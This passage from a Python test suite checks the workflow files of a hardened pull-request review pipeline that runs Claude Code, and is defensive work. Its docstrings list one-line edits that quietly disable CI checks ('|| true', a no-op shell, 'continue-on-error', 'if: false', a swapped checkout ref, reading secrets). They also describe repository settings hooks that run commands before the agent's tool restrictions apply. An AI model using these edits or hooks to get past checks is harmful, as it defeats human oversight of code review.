    Omitting the line does not fail anything — it silently widens a stolen
    credential from 15 minutes to an hour, which is exactly why a comment in
    this workflow calls the line load-bearing.
    """

    def test_every_role_assumption_requests_the_minimum(self):
        # EVERY STEP THAT ASSUMES A ROLE, found by its `uses:` VALUE. Splitting
        # the file on the literal `uses: aws-actions/configure-aws-credentials`
        # missed a fourth assumption written `uses: 'aws-actions/…'` — legal,
        # and invisible to a substring — while the three it did find still read
        # 900. It also red on quoting any of the three.
        steps = steps_using(STAGE2.read_text(), "aws-actions/configure-aws-credentials")
        self.assertEqual(len(steps), 3, f"role assumptions: {len(steps)}, expected 3")
        for i, step in enumerate(steps, 1):
            # THE VALUE, AND THE ACTION'S INPUT. `role-duration-seconds: 3600 #
            # role-duration-seconds: 900` satisfies a containment check while
            # widening a stolen credential from fifteen minutes to the role's
            # one-hour ceiling — and the same key MOVED into the step's `env:`
            # satisfies one too, while the action receives no bound at all.
            # `with_block` is what makes it the input rather than the text.
            seen = mapping_items(with_block(step)).get("role-duration-seconds")
            self.assertEqual(
                seen,
                "900",
                f"assumption #{i} requests {seen!r} seconds, not '900'",
            )


class TestTriggerTypesAgreeAcrossStages(unittest.TestCase):
    """Stage 2 re-validates `trigger_event` against a literal allowlist.

    It is an allowlist, so drift does not fail open — a type Stage 1 emits and
    Stage 2 does not know fails every run of that type at the regex. That is
    safe and completely invisible until someone uses the trigger.
    """

    def test_stage2_accepts_every_type_stage1_emits(self):
        types = re.search(r"types:\s*\[([^\]]*)\]", strip_comments(STAGE1.read_text()))
        self.assertIsNotNone(types)
        emitted = {t.strip() for t in types.group(1).split(",") if t.strip()}
        pattern = re.search(r'TRIGGER"\s*=~\s*\^\(([^)]*)\)\$', STAGE2.read_text())
        self.assertIsNotNone(pattern, "trigger_event validation regex not found")
        accepted = set(pattern.group(1).split("|"))
        self.assertEqual(
            emitted - accepted, set(), "Stage 1 emits types Stage 2 rejects"
        )

    def test_ready_for_review_is_covered(self):
        """A PR labelled while draft gets no review until this event exists."""
        self.assertIn("ready_for_review", strip_comments(STAGE1.read_text()))


class TestTheSuiteActuallyRunsInCI(unittest.TestCase):
    """Every other contract in this file assumes something executes it.

    The suite was unwired for the whole of this build: no workflow ran
    `unittest discover`, so each invariant below could have been deleted in a
    green pull request. This class pins the wiring itself — including the paths
    filter, because the contract tests assert on workflow TEXT and would
    otherwise not run for a change that touches only YAML.
    """

    REQUIRED_PATHS = (
        "scripts/pr_review/**",
        ".github/workflows/hardened-pr-review.yml",
        ".github/workflows/hardened-pr-review-run.yml",
        ".claude/hooks/pr_review/**",
        ".claude/skills/pr-review-readiness/**",
        # This file's OWN path. Without it, an edit that rewires or weakens the
        # wiring is the one change that schedules no run of the suite checking
        # the wiring.
        ".github/workflows/pr-review-scripts-test.yml",
    )

    def setUp(self):
        self.assertTrue(
            SUITE_CI.is_file(), f"{SUITE_CI.name} is missing — the suite runs nowhere"
        )
        self.text = SUITE_CI.read_text()

    def test_it_runs_the_discovery_form_over_every_module(self):
        """Naming one module skips the other two, silently and greenly."""
        self.assertIn(
            "python3 -m unittest discover -s scripts/pr_review -t .",
            strip_comments(self.text),
        )

    def test_it_refuses_a_discovery_suppressing_package_hook(self):
        """The one guard that cannot live inside the suite it guards.

        `load_tests` on `scripts/pr_review/__init__.py` stops discovery before a
        single test is collected, so every in-suite check is silent about it.
        This step runs outside the subtree; without it the suite's own
        completeness guarantee is void.

        It also covers the emptied suite, whose exit code is interpreter-
        dependent, so neither of the two "the suite never ran" cases rests on a
        test inside the suite.

        Pinned on the REJECTION, not just the words: a step that evaluates
        `hasattr` and discards the answer would satisfy a substring check while
        guarding nothing, so each condition is pinned together with the
        `raise SystemExit` that acts on it.
        """
        body = strip_comments(self.text)
        step = "\n".join(
            indented_block(body, "- name: Refuse a suppressed or emptied suite")
        )
        self.assertTrue(
            step.strip(), "the preflight step is gone; nothing checks either case"
        )
        self.assertIn("import scripts.pr_review as p", step)
        self.assertIn("if hasattr(p, 'load_tests'):", step)
        self.assertIn("EXPECTED_MODULES", step)
        self.assertIn("if missing:", step)
        # Two conditions, and each must actually reject. `assert` would not: -O
        # or a PYTHONOPTIMIZE in the environment strips it and the step passes.
        self.assertEqual(
            step.count("raise SystemExit"), 2, "a checked condition does not reject"
        )

    PREFLIGHT_STEP = "- name: Refuse a suppressed or emptied suite"

    def _preflight_entry(self) -> str:
        return "\n".join(indented_block(strip_comments(self.text), self.PREFLIGHT_STEP))

    def _preflight(self) -> str:
        """The preflight step's WHOLE `run:` body, ready to run under bash.

        THE WHOLE BODY, not the `python3 -c` program inside it. Extracting just
        the program made the test blind to the shell around it: appending
        `|| true` after the closing quote leaves the Python byte-identical, so
        every assertion here stayed green while CI accepted both of the states
        this step exists to refuse. What runs in CI is the block; the block is
        what gets run.
        """
        step = self._preflight_entry()
        self.assertTrue(step.strip(), "the preflight step is gone")
        return textwrap.dedent(scalar_block(step, "run"))

    def _run_preflight(self, *, hook: bool = False, delete: str = "") -> int:
        """RUN it against a synthesized tree. Returns the exit status.

        A real subtree rather than the repository's own: the two rejections are
        about states this repository must never be in, so they can only be
        exercised somewhere else.
        """
        with tempfile.TemporaryDirectory() as td:
            pkg = Path(td) / "scripts" / "pr_review"
            pkg.mkdir(parents=True)
            (pkg.parent / "__init__.py").write_text("")
            (pkg / "__init__.py").write_text(
                "def load_tests(*a, **k):\n    return None\n" if hook else ""
            )
            shutil.copy(HERE_MANIFEST, pkg / HERE_MANIFEST.name)
            for name in EXPECTED_MODULES:
                if name != delete:
                    (pkg / name).write_text("")
            bash = shutil.which("bash")
            self.assertIsNotNone(bash, "premise changed: bash is not installed")
            # `python3` on PATH is what the runner uses, but this sandbox's
            # interpreter is the one that can import nothing unexpected, so it
            # is put FIRST on PATH under that name.
            shim = Path(td) / "bin"
            shim.mkdir()
            (shim / "python3").symlink_to(sys.executable or "/usr/bin/python3")
            # `-e`, because that is the shell Actions declares. A `run:` with
            # no `shell:` key runs under `bash -e {0}` (NOT `-o pipefail`, which
            # only comes with an explicit `shell: bash`). Without `-e` the
            # harness is more permissive than CI: a second command after the
            # python masks its non-zero exit here and not there, so a legal
            # two-command refactor reads as a false red and a body whose refusal
            # depends on `-e` reads as accepting a state CI refuses.
            return subprocess.run(
                [bash, "-e", "-c", self._preflight()],
                cwd=td,
                capture_output=True,
                text=True,
                env={**os.environ, "PATH": f"{shim}:{os.environ.get('PATH', '')}"},
            ).returncode

    def test_the_preflight_actually_rejects_both_states(self):
        """EXECUTED, because the structural test above cannot see control flow.

        Counting two `raise SystemExit` and matching the condition strings is
        satisfied by both raises nested under `if False:`, by a condition that
        tests the wrong object, and by the second check shadowing the first.
        The three cases below are the contract the step exists for, and the
        healthy case is what keeps a step that rejects EVERYTHING from passing
        the other two.
        """
        self.assertEqual(self._run_preflight(), 0, "the preflight rejects a good tree")
        self.assertNotEqual(
            self._run_preflight(hook=True),
            0,
            "a `load_tests` hook on scripts/pr_review/__init__.py is accepted; "
            "it suppresses discovery of the whole suite before one test is "
            "collected, and nothing inside the suite can see that.",
        )
        for name in sorted(EXPECTED_MODULES):
            with self.subTest(deleted=name):
                self.assertNotEqual(
                    self._run_preflight(delete=name),
                    0,
                    f"deleting {name} is accepted by the preflight",
                )

    def test_the_suite_job_cannot_tolerate_its_own_failure(self):
        """ONE LINE HERE MAKES EVERY CONTRACT IN THIS FILE ADVISORY.

        `continue-on-error: true` on the `test` JOB makes GitHub report the
        job's conclusion as `success` when a step failed, so the run concludes
        `success` and the PR check is green while `Run the pr_review suite` red.
        Four thousand lines of contract, including every remedy in this class,
        then assert nothing that can block a merge. Measured: with that single
        line the suite still reports `Ran N tests … OK` and CI stays green.

        It is not an exotic spelling either — `llm_td_retrieval.yml`,
        `upload-test-stats.yml`, `unstable.yml` and `unstable-periodic.yml` all
        carry it at job level in this repository, so it reads as ordinary.

        Scanned over the WHOLE job, so a step-level copy is covered too, and
        through `_key_re`, so `"continue-on-error":` and `continue-on-error :`
        are as refused as the bare spelling.
        """
        offenders = [
            ln
            for ln in strip_comments(job_block(self.text, "test")).splitlines()
            if _key_re("continue-on-error").match(ln.lstrip())
        ]
        self.assertEqual(
            offenders,
            [],
            f"the suite job tolerates its own failure ({offenders}); the run "
            "still concludes `success`, so every contract in this file becomes "
            "advisory.",
        )

    def test_the_suite_job_cannot_be_skipped(self):
        """The guard above refuses `continue-on-error` and nothing else.

        `if: false` on the `test` JOB concludes it `skipped`, not `failure`, so
        the run is green and every contract in this file is advisory — the same
        outcome as `continue-on-error`, reached through the key that guard does
        not name. Measured: one line, 320 tests still green.

        The job carries a LEGITIMATE `if:`, so the value is pinned rather than
        the key forbidden. A second `if:` anywhere in the job — including on a
        step — reds this too, which is the right direction: a step-level `if:`
        on the preflight or the suite step is the same hole one level down.
        """
        expected = "github.repository_owner == 'pytorch'"
        block = strip_comments(job_block(self.text, "test"))
        # `needs:` IS A SKIP CONDITION. A job whose prerequisite is skipped is
        # itself skipped, through the implicit `success()` Actions applies —
        # so adding `needs: [gate]` with `gate` carrying `if: false` reaches
        # exactly the outcome this test forbids, without touching this job's
        # own `if:`. The suite job depends on nothing, and must not start to.
        depends = [
            ln.strip()
            for ln in block.splitlines()
            if _key_re("needs").match(ln.lstrip())
        ]
        self.assertEqual(
            depends,
            [],
            f"the suite job declares {depends}; a skipped prerequisite skips "
            "it too, and a skipped job blocks nothing.",
        )
        conditions = [
            plain_scalar(m.group(1)).strip()
            for ln in block.splitlines()
            if (m := _key_re("if").match(ln.lstrip()))
        ]
        self.assertEqual(
            conditions,
            [expected],
            f"the suite job's conditions are {conditions}, not [{expected!r}]. "
            "A job Actions skips concludes `skipped`, which no required check "
            "reads as a failure, so every contract in this file stops blocking "
            "a merge.",
        )

    def test_the_suite_ci_checks_out_the_code_under_test(self):
        """Every contract in this file is advisory if the job runs main's copy.

        This class is thorough about the job not being skippable, not tolerating
        its own failure, not dodging the command and not being narrowed by
        `paths:` — and said nothing about WHICH tree it checks out. Adding
        `ref: ${{ github.event.pull_request.base.sha }}` to that checkout is
        one line, and after it the suite validates the base branch's workflows
        on every pull request: green for exactly the change class it exists to
        catch. The default ref is the right one, so the input is refused rather
        than pinned to a value.
        """
        checkouts = steps_using(SUITE_CI.read_text(), "actions/checkout")
        self.assertEqual(len(checkouts), 1, f"suite CI checkouts: {len(checkouts)}")
        inputs = mapping_items(with_block(checkouts[0]))
        self.assertEqual(
            inputs,
            {"fetch-depth": "1", "persist-credentials": "false"},
            f"the suite CI checkout declares {inputs}; anything that redirects "
            "it — `ref:`, `repository:`, `path:` — points this suite at a tree "
            "other than the one the pull request changes.",
        )

    def test_the_suite_step_runs_the_discovery_command_and_cannot_dodge_it(self):
        """The job guard above does not cover the STEP that runs the suite.

        Two one-line edits make every contract in this file advisory while the
        presence check on the command string stays green: `|| true` appended to
        the `run:` body, and `shell: bash -c "exit 0" {0}` on the step, which
        skips the command entirely. So the body is required to be EXACTLY the
        fatal discovery command, and the step is put through the same
        disabling-key refusal as the preflight and the Stage-2 path gate.
        """
        entry = "\n".join(
            indented_block(strip_comments(self.text), "- name: Run the pr_review suite")
        )
        self.assertTrue(entry.strip(), "the step that runs the suite is gone")
        refuse_disabling_keys(self, entry, "the suite step")
        # An inline `run:`, not a block scalar — read it off the key line. A
        # block-scalar spelling would give `_key_re` an empty value and fail
        # here rather than passing, which is the right direction.
        #
        # AND THE LINES AFTER IT. A plain scalar CONTINUES onto more-indented
        # lines, which YAML folds into one value, so `|| true` written on the
        # next line is part of this command — reading only the key's own line
        # cannot see it. Measured as a green suppression of the whole suite.
        lines = entry.splitlines()
        runs = [
            (i, m.group(1))
            for i, ln in enumerate(lines)
            if (m := _key_re("run").match(ln.lstrip()))
        ]
        self.assertEqual(len(runs), 1, f"expected one `run:` in the step, got {runs}")
        idx, first = runs[0]
        key_indent = len(lines[idx]) - len(lines[idx].lstrip())
        folded = []
        for ln in lines[idx + 1 :]:
            if not ln.strip() or len(ln) - len(ln.lstrip()) <= key_indent:
                break
            folded.append(ln.strip())
        self.assertEqual(
            folded,
            [],
            f"the suite step's command continues onto {folded}; YAML folds "
            "those into the command, so `|| true` there suppresses the suite.",
        )
        body = plain_scalar(first).strip()
        self.assertEqual(
            body,
            "python3 -m unittest discover -s scripts/pr_review -t .",
            f"the suite step's command is {body!r}. Anything appended to it — "
            "`|| true` above all — lets failing contracts conclude `success`.",
        )

    def test_nothing_in_the_suite_job_executes_outside_its_steps(self):
        """The same interpreter hole as Stage 2's `prepare`, in the job that
        decides whether any of this is enforced.

        `jobs.test.defaults.run.shell: bash -c "exit 0" {0}` makes BOTH the
        preflight and the suite step succeed without running their programs,
        while every structural assertion here stays green — and the preflight
        harness would go on selecting `bash -e` for itself, measuring a shell
        CI does not use.
        """
        refuse_execution_outside_steps(self, self.text, "test")

    def test_the_preflight_step_cannot_be_skipped_or_tolerated(self):
        """A rejection that does not reach CI is not a rejection.

        The executing test above runs the step's whole `run:` body, so a
        swallowed failure INSIDE it is caught. These two are outside the body
        and invisible to it: `continue-on-error: true` lets the job proceed past
        a non-zero step, and `if:` lets Actions skip it. Either leaves the suite
        running against a state this step exists to refuse.
        """
        refuse_disabling_keys(self, self._preflight_entry(), "the preflight step")

    def _entry_point_exit(self, *, successful: bool, tests_run: int, argv=()):
        """Drive `run_this_suite` with a stubbed loader/runner; return the code.

        Mocked because the three states below cannot all be reached by running
        the real suite, and NOT relied on alone: the test after next runs the
        real entry point end to end, which is what keeps this stub honest about
        the arguments `discover` is actually given.
        """
        result = unittest.mock.Mock()
        result.wasSuccessful.return_value = successful
        result.testsRun = tests_run
        runner = unittest.mock.Mock()
        runner.run.return_value = result
        with (
            unittest.mock.patch.object(unittest, "TestLoader"),
            unittest.mock.patch.object(unittest, "TextTestRunner", return_value=runner),
            unittest.mock.patch.object(sys, "argv", ["prog", *argv]),
            contextlib.redirect_stderr(io.StringIO()),
        ):
            with self.assertRaises(SystemExit) as raised:
                run_this_suite()
        return raised.exception.code

    def test_the_module_entry_point_reports_a_failing_suite(self):
        """`python3 scripts/pr_review/test_<x>.py` runs the whole suite — and
        has to exit non-zero on each way that can go wrong.

        Found by mutation: replacing the status with a constant `SystemExit(0)`
        left every other test in this repository green. An entry point that
        cannot fail is the exact shape of "green means nothing", and this one is
        new, so nothing else was watching it.

        A ZERO-TEST RUN IS A FAILURE, and it is the case the obvious
        implementation gets wrong: `wasSuccessful()` is True on an empty suite,
        so a package-level `load_tests` that suppresses discovery would exit 0.
        That is the same suppression the CI preflight refuses, arriving by a
        route the preflight does not cover.
        """
        self.assertEqual(self._entry_point_exit(successful=True, tests_run=311), 0)
        self.assertNotEqual(
            self._entry_point_exit(successful=False, tests_run=311),
            0,
            "a failing suite exits 0 from the module entry point",
        )
        self.assertNotEqual(
            self._entry_point_exit(successful=True, tests_run=0),
            0,
            "a run that collected NO tests exits 0; discovery being suppressed "
            "then reads exactly like a clean suite.",
        )

    def test_the_module_entry_point_refuses_a_selector_it_cannot_honour(self):
        """`unittest.main()` took `Class.test_name`, `-k` and `-v`; this does not.

        Silently ignoring them is the harm: someone selecting a test they
        misspelled, or one that no longer exists, reads a green whole-suite run
        as confirmation that it passed.
        """
        for argv in (["TestX.test_y"], ["-k", "pattern"], ["-v"]):
            with self.subTest(argv=argv):
                self.assertNotEqual(
                    self._entry_point_exit(successful=True, tests_run=311, argv=argv),
                    0,
                    f"{argv} was accepted and silently ignored",
                )

    def test_the_real_entry_point_runs_this_suite_and_passes(self):
        """The stub above proves the STATUS mapping and nothing else.

        It patches `TestLoader` out entirely, so `start_dir`, `pattern` and
        `top_level_dir` are never exercised — a `discover` pointed at the wrong
        directory, or given a pattern matching nothing, keeps every assertion
        above green. This runs the shipped entry point for real, from a cwd
        that is not the repository, and requires it to find this very suite.

        IT MUST NOT RE-ENTER, and the first version did: the child runs the
        WHOLE suite, which contains this test, which spawns another child. The
        recursion has no base case and no timeout — it hung the run rather than
        failing it. The env marker below is the base case, and it is the reason
        this test cannot simply be written as "run it and see".
        """
        # THE MARKER NAMES OUR SPAWNER, and a bare truthy value would not do.
        # With `if os.environ.get(MARKER)`, a value inherited from anywhere — a
        # developer's export, a workflow `env:`, a nested invocation — skipped
        # this test in the PARENT as well, so the only check on `run_this_suite`'s
        # real `discover` arguments vanished and the run stayed green. Comparing
        # against our actual parent pid means a leaked value cannot match: the
        # test runs, spawns a child, and the child (whose ppid IS ours) skips.
        # `!= "1"` as well: under a container init our ppid CAN be 1, and a
        # leaked marker of `1` would then match by coincidence and skip the only
        # real check on `run_this_suite`'s discover arguments.
        marker = os.environ.get(REENTRY_MARKER)
        if marker and marker != "1" and marker == str(os.getppid()):
            self.skipTest(f"{REENTRY_MARKER} names our parent: this IS the child")
        module = HERE_MANIFEST.parent / "test_emit_row.py"
        # TIMEOUT, because the marker is the base case and a base case can be
        # lost. The original defect was a hang, not a failure; if a later
        # refactor of how the child is spawned drops the marker, this bounds the
        # damage to a loud `TimeoutExpired` instead of a run that never ends.
        # CI has `timeout-minutes`; a local run has nothing but this.
        proc = subprocess.run(
            [sys.executable or "python3", str(module)],
            cwd=tempfile.gettempdir(),
            capture_output=True,
            text=True,
            env={**os.environ, REENTRY_MARKER: str(os.getpid())},
            timeout=300,
        )
        self.assertEqual(
            proc.returncode,
            0,
            f"`python3 {module}` did not pass:\n{proc.stdout}\n{proc.stderr}",
        )
        ran = re.search(r"^Ran (\d+) tests", proc.stderr, re.M)
        self.assertIsNotNone(ran, f"no test count in:\n{proc.stderr}")
        # A LOOSE COUNT IS NOT ENOUGH — `> 100` was cleared by this module
        # alone, so it never established "the whole suite" — and an exact skip
        # count is not either: `test_symlink_scrub` skips four permission
        # fixtures under root, so `skipped=1` red a perfectly clean run inside
        # any container and pointed the reader at the entry point. So: `OK`
        # (no failures, no errors) plus the count the LOCAL loader discovers.
        # That is what actually detects "discovering something narrower", it
        # needs no literal to keep in step, and it is indifferent to how many
        # environment-dependent skips the suite contains.
        self.assertRegex(
            proc.stderr,
            r"(?m)^OK(?: \(skipped=\d+\))?$",
            f"the child did not finish clean. Tail:\n{proc.stderr[-2000:]}",
        )
        expected = (
            unittest.TestLoader()
            .discover(start_dir=str(HERE_MANIFEST.parent), top_level_dir=str(REPO))
            .countTestCases()
        )
        self.assertEqual(
            int(ran.group(1)),
            expected,
            f"the entry point ran {ran.group(1)} tests; discovery from here "
            f"finds {expected}. It is pointed at a narrower tree or pattern.",
        )

    def test_the_preflight_runs_before_the_suite(self):
        """It is worthless after the step whose result it is meant to qualify."""
        body = strip_comments(self.text)
        self.assertLess(
            body.index("- name: Refuse a suppressed or emptied suite"),
            body.index("- name: Run the pr_review suite"),
            "the preflight runs after the suite it is supposed to gate",
        )

    def _halves(self) -> tuple[str, str]:
        """(push half, pull_request half) of `on:`, split on the PR key.

        It assumes `push:` precedes `pull_request:`, so the order is ASSERTED
        below rather than relied on — reordering them used to make the PR
        assertions silently read the push list instead.
        """
        body = strip_comments(self.text)
        halves = body.split("pull_request:", 1)
        self.assertEqual(len(halves), 2, "no pull_request trigger: nothing gates a PR")
        return halves[0], halves[1]

    def test_the_two_triggers_are_in_the_order_the_slicing_assumes(self):
        """The premise `_halves` rests on, asserted instead of assumed."""
        body = strip_comments(self.text)
        self.assertLess(
            body.index("push:"),
            body.index("pull_request:"),
            "the triggers were reordered; the path assertions below now read "
            "the wrong filter and would pass while one of them is empty",
        )

    @staticmethod
    def _path_items(half: str) -> list[str]:
        """The items of the `paths:` list — that exact key — each a whole entry.

        Scoped to the key and its indented block, not "every `- x` in the
        half": renaming `paths:` to `paths-ignore:` INVERTS the filter while
        leaving every entry where a whole-half scan would still find it.

        Whole entries, because substring membership is not the same test and
        the difference defeats exactly the coverage this filter provides: both
        `"!.claude/hooks/pr_review/**"` — an EXCLUSION — and
        `".claude/hooks/pr_review/**/*.py"` — a NARROWING that misses
        `restrict-write.sh` — contain the required string while the filter no
        longer schedules the run.
        """
        lines = half.splitlines()
        pat = _key_re("paths")  # `"paths":` is the same key, quoted
        starts = [
            i
            for i, ln in enumerate(lines)
            if (m := pat.match(ln)) and not m.group(1).strip()
        ]
        assert len(starts) == 1, f"expected one `paths:` key, found {len(starts)}"
        i = starts[0]
        key_indent = len(lines[i]) - len(lines[i].lstrip())
        items, seq_indent = [], None
        for nxt in lines[i + 1 :]:
            if not nxt.strip():
                continue
            indent = len(nxt) - len(nxt.lstrip())
            entry = re.fullmatch(r"-[ \t]+(.*)", nxt.strip())
            if seq_indent is None:
                # A sequence may be indented level with its key — legal YAML,
                # and breaking on `<= key_indent` returned an EMPTY list for
                # it, which passes nothing and fails everything.
                if indent < key_indent or (indent == key_indent and not entry):
                    break
                assert entry, f"a `paths:` list starts with a non-item line: {nxt!r}"
                seq_indent = indent
            elif indent < seq_indent or (
                # A SIBLING KEY ends the list. With the sequence indented level
                # with its own key, a following `branches: [main]` sits at the
                # entries' indentation, and stopping only on a SMALLER indent
                # folded it into the last pattern.
                indent == seq_indent and not entry and _ANY_KEY.match(nxt)
            ):
                break
            # THE SEQUENCE'S OWN INDENTATION decides what is an entry. Matching
            # `- …` on the stripped line counted a MORE-INDENTED `- x` as a
            # sixth entry, when YAML folds it — hyphen and all — into the
            # entry above; five required patterns were reported present while
            # the filter held one folded pattern matching none of them.
            if indent == seq_indent and entry:
                raw = entry.group(1)
                assert not BLOCK_HEADER.fullmatch(uncommented(raw)), (
                    f"a `paths:` entry is a block scalar ({uncommented(raw)!r}); "
                    "this reader does not decode one, and `>- !**` would read "
                    "as a harmless string while excluding every path."
                )
                items.append(plain_scalar(raw))
                continue
            # A plain scalar CONTINUES onto a more-indented line and YAML FOLDS
            # the two with a space, so `- scripts/pr_review/**` over an
            # indented `/elsewhere` is the ONE pattern `scripts/pr_review/**
            # /elsewhere`, which matches nothing the first line does. Folded
            # here for the same reason, or the membership test below would see
            # a required entry that the filter does not actually contain.
            assert items, f"a `paths:` list starts with a continuation: {nxt!r}"
            items[-1] = f"{items[-1]} {uncommented(nxt.strip())}".strip()
        return items

    def _assert_covers(self, half: str, which: str) -> None:
        items = self._path_items(half)
        for path in self.REQUIRED_PATHS:
            self.assertIn(
                path,
                items,
                f"{path} is not a whole entry in the {which} paths filter; "
                f"entries are {items}",
            )
        # An exclusion later in the list wins over every positive entry above
        # it, so a single `!**` disables the filter while leaving each required
        # entry exactly where this test looks for it.
        self.assertEqual(
            [e for e in items if e.startswith("!")],
            [],
            f"the {which} paths filter carries an EXCLUSION, which overrides "
            f"the entries above it: {items}",
        )

    def test_pull_request_triggers_it_for_python_and_for_yaml(self):
        _, pr = self._halves()
        self._assert_covers(pr, "pull_request")
        # NO OTHER FILTER on this half. The `push:` half's `branches:` is
        # pinned below for exactly this reason, and the `pull_request:` half
        # was left open: `branches: [release]` or `types: [labeled]` here means
        # no ordinary pull request touching these paths ever runs the suite,
        # every contract in this file stops gating a merge, and this test —
        # whose name promises the TRIGGER, not just the path list — stays
        # green. Measured.
        #
        # `indented_block`, not the `_halves` slice: that half runs to the end
        # of the file, so scanning it for keys collects the `test` job's as
        # well.
        keys = indented_block(strip_comments(self.text), "pull_request:")
        extra = sorted(
            {
                m.group(1)
                for ln in keys
                if (m := re.match(r"^\s{4}([a-z-]+):", ln)) and m.group(1) != "paths"
            }
        )
        self.assertEqual(
            extra,
            [],
            f"the pull_request trigger carries {extra} beside `paths:`. Any "
            "of those narrows which pull requests run the suite at all, "
            "which no path assertion here can see.",
        )

    def test_push_to_main_triggers_it_for_the_same_paths(self):
        """BOTH filters, because only one of them was ever checked.

        This file carries two independent `paths:` lists. The test above reads
        the text AFTER `pull_request:`, so a path silently dropped from the
        `push:` list changed nothing it could see — and that is the list that
        runs the suite on `main`. A regression merged to main would then never
        be caught there, only on the next PR that happens to touch a path still
        in the other filter.
        """
        push, _ = self._halves()
        # The BRANCH, not merely the presence of a `branches:` key: changing
        # `[main]` to `[release]` disables the main-branch run entirely while
        # leaving every path assertion satisfied. `!main` is an EXCLUSION, so
        # the `!` is kept rather than tokenized away. The one-line flow-list
        # spelling this reads is pinned by TestTheReadersPremisesStillHold.
        m = next(
            (mm for ln in push.splitlines() if (mm := _key_re("branches").match(ln))),
            None,
        )
        self.assertIsNotNone(m, "premise changed: push has no branches filter")
        listed = re.findall(r"!?[\w./*-]+", uncommented(m.group(1)))
        self.assertTrue(
            listed,
            "the push `branches:` filter is no longer an inline list; this "
            "reader is line-at-a-time — see TestTheReadersPremisesStillHold."
            "test_the_suite_ci_branch_filter_is_a_single_line_flow_list",
        )
        self.assertIn(
            "main", listed, f"the push trigger does not run on main: {listed}"
        )
        self.assertNotIn("!main", listed, "the push trigger EXCLUDES main")
        self._assert_covers(push, "push")

    def test_it_holds_no_more_capability_than_the_workflows_it_tests(self):
        """It executes PR-authored Python, so it must stay a read-only
        `pull_request` job — never `pull_request_target`, never a write scope,
        never a secret."""
        body = strip_comments(self.text)
        self.assertNotIn("pull_request_target", body)
        # BOTH ways to reach the context. `secrets.` alone missed the equally
        # ordinary `secrets['CI_TOKEN']`, which a maintainer wiring up a test
        # dependency would plausibly write, and which hands the value to
        # PR-authored Python.
        self.assertNotRegex(body, r"secrets\s*[.\[]")
        self.assertNotIn("id-token", body)
        # EVERY `permissions:` block, not the first one. A job-level block
        # OVERRIDES the workflow-level one, so `jobs.test.permissions.contents:
        # write` left the top-level `contents: read` exactly where a
        # first-match reader looks for it while the job ran with write.
        lines = body.splitlines()
        blocks = []
        for i, ln in enumerate(lines):
            m = _key_re("permissions").match(ln)
            if not m:
                continue
            # BOTH SPELLINGS. Skipping keys that carry a value read the INLINE
            # flow mapping `permissions: {contents: write}` as "not a
            # permissions block", so a job-level override sat one line away
            # from an assertion that was still passing on the workflow-level
            # `contents: read` above it.
            inline = uncommented(m.group(1))
            if inline:
                blocks.append(_scopes(inline.strip().strip("{}")))
                continue
            # Read the block from THIS line's indentation. Handing the key back
            # to `indented_block`, which matches a literal `permissions:`,
            # meant the two readers disagreed about what the key is: `_key_re`
            # accepts `"permissions":` and `permissions :`, and either
            # cosmetic edit then raised "not found" from the second reader.
            indent = len(lines[i]) - len(lines[i].lstrip())
            out = []
            for nxt in lines[i + 1 :]:
                if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
                    break
                if nxt.strip():
                    out.append(nxt.strip())
            blocks.append(_scopes(",".join(out)))
        self.assertTrue(blocks, "the workflow declares no permissions block")
        for perms in blocks:
            self.assertEqual(perms, "contents: read")


class TestReviewLabelAgreesAcrossStages(unittest.TestCase):
    """The gating label is spelled in three places and nothing keeps them level.

    Stage 1 carries it as `env.REVIEW_LABEL` and again as a literal in its
    job-level `if:` — unavoidable, because the `env` context is not available
    there — and Stage 2 carries the trusted copy that decides eligibility. Move
    one and the pipeline does not break loudly: Stage 1 keeps firing while
    Stage 2 reads the PR's labels for a string nobody applies, calls every run
    ineligible, and writes no rows. A review that silently stops happening is
    the exact failure class this file exists for.
    """

    @staticmethod
    def _env_label(text: str) -> str:
        m = re.search(r"^\s*REVIEW_LABEL:\s*(.+?)\s*$", strip_comments(text), re.M)
        assert m is not None, "REVIEW_LABEL env not found"
        return m.group(1).strip().strip("\"'")

    def test_both_stages_declare_the_same_label(self):
        self.assertEqual(
            self._env_label(STAGE1.read_text()), self._env_label(STAGE2.read_text())
        )

    def test_the_job_if_literals_match_the_declared_label(self):
        """The `if:` cannot read `env`, so these two are hand-copied."""
        label = self._env_label(STAGE1.read_text())
        body = strip_comments(STAGE1.read_text())
        added = re.search(r"github\.event\.label\.name\s*==\s*'([^']*)'", body)
        carried = re.search(
            r"contains\(github\.event\.pull_request\.labels\.\*\.name,\s*'([^']*)'\)",
            body,
        )
        self.assertIsNotNone(
            added, "the `labeled` branch of the job `if:` was not found"
        )
        self.assertIsNotNone(
            carried, "the already-labelled branch of the job `if:` was not found"
        )
        self.assertEqual(
            added.group(1), label, "the `labeled` literal drifted from REVIEW_LABEL"
        )
        self.assertEqual(
            carried.group(1), label, "the `contains` literal drifted from REVIEW_LABEL"
        )


class TestCorroboratedValuesAreTheOnlyOnesOffered(unittest.TestCase):
    """`base_sha` and `is_fork` must reach a row only from the trusted API.

    Both arrive first in the Stage-1 artifact, where the PR author writes them:
    an unverified `base_sha` selects what the model is shown, and an unverified
    `is_fork` mislabels every row. `prepare` re-derives both from the REST API,
    and used to export the artifact's copies alongside — dead, but one
    autocomplete away from being picked, with only a comment against it.
    """

    def test_the_artifact_copies_are_not_exported_at_all(self):
        prepare = strip_comments(job_block(STAGE2.read_text(), "prepare"))
        coords = prepare.split("id: freshness", 1)[0]
        for field in ("base_sha", "is_fork"):
            self.assertNotIn(
                f'echo "{field}=',
                coords,
                f"the coords step exports an unverified {field}",
            )

    def test_every_consumer_reads_the_freshness_copy(self):
        text = strip_comments(STAGE2.read_text())
        for field in ("base_sha", "is_fork"):
            self.assertNotIn(
                f"steps.coords.outputs.{field}",
                text,
                f"a consumer reads the unverified {field}",
            )
            self.assertIn(f"steps.freshness.outputs.{field}", text)


class TestReviewJobConfigDiscoveryIsClosed(unittest.TestCase):
    """`--setting-sources user` is the boundary, and nothing else enforces it.

    Claude Code loads CLAUDE.md, .claude/settings.json and .mcp.json from the
    working tree and its ancestors. A hook in that settings file is arbitrary
    command execution that runs BEFORE any --allowedTools policy applies, so
    the read-only-tools story is void without this flag.

    THE VALUE IS LOAD-BEARING IN BOTH DIRECTIONS, and this test used to demand
    the one spelling that is wrong on both counts. It required
    `--setting-sources ""`, which was measured against the CLI directly — but
    the deployment goes through claude-code-action, whose parser records a flag
    with a falsy next token as a boolean `null`
    (base-action/src/parse-sdk-options.ts), after which its own fallback loads
    `user,project,local`. So the empty form left discovery fully ON while this
